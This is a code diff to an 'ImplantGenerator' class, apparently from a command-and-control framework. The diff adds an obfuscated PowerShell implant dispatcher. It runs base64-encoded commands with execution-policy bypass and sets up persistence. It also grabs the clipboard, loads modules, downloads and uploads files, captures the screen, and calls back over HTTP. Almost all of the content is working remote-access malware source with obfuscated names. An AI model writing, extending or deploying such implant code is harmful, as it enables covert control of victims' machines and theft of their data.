@@ -36,7 +36,7 @@ class ImplantGenerator:
         "obf_screen_capture": "screen-capture"
         }
 
-    execute_command = '''
+    old_execute_command = '''
 function {{ ron.obf_builtin_command }}($data){
     $a = $data.Substring(0,2)
     $script:command_id = $data.Substring(2,24)
@@ -73,6 +73,44 @@ function {{ ron.obf_builtin_command }}($data){
     }
 }
 '''
+
+    execute_command = '''
+function {{ ron.obf_builtin_command }}($data){
+    $a = $data.Substring(0,2)
+    $script:command_id = $data.Substring(2,24)
+    if ($data.Substring(26).length -gt 1){
+        $b = [System.Convert]::FromBase64String($data.Substring(26))
+    }
+    
+    if($a -eq "CM"){
+        $c = [System.Convert]::ToBase64String([system.Text.Encoding]::Unicode.getbytes([System.Text.Encoding]::UTF8.GetString($b)))
+        $Script:tr = powershell.exe -exec bypass -EncodedCommand $c
+    } elseif($a -eq "SI"){
+        {{ ron.obf_collect_sysinfo }}
+    } elseif ($a -eq "EP"){
+        {{ ron.obf_create_persistence }}
+    } elseif ($a -eq "PS"){
+        {{ ron.obf_remote_play_audio }}($b)
+    } elseif ($a -eq "EC"){ 
+        {{ ron.obf_get_clipboard }} 
+    } elseif ($a -eq "LM"){
+        {{ ron.obf_load_module }}([System.Text.Encoding]::UTF8.GetString($b))
+    } elseif ($a -eq "IM"){
+        {{ ron.obf_invoke_module }}([System.Text.Encoding]::UTF8.GetString($b))
+    } elseif ($a -eq "ML"){
+        {{ ron.obf_get_loaded_modules }}  
+    } elseif ($a -eq "FD"){
+        {{ ron.obf_download_file }}([System.Text.Encoding]::UTF8.GetString($b))
+    } elseif ($a -eq "UF"){
+        {{ ron.obf_upload_file }}([System.Text.Encoding]::UTF8.GetString($b))
+    } elseif ($a -eq "SC"){
+        {{ ron.obf_screen_capture }}([System.Text.Encoding]::UTF8.GetString($b))
+    } else {
+        $Script:tr = "0"
+    }
+}
+'''
+
 
     http_function = '''
 function {{ ron.obf_http_conn }}(${{ ron.obf_callback_reason }}){
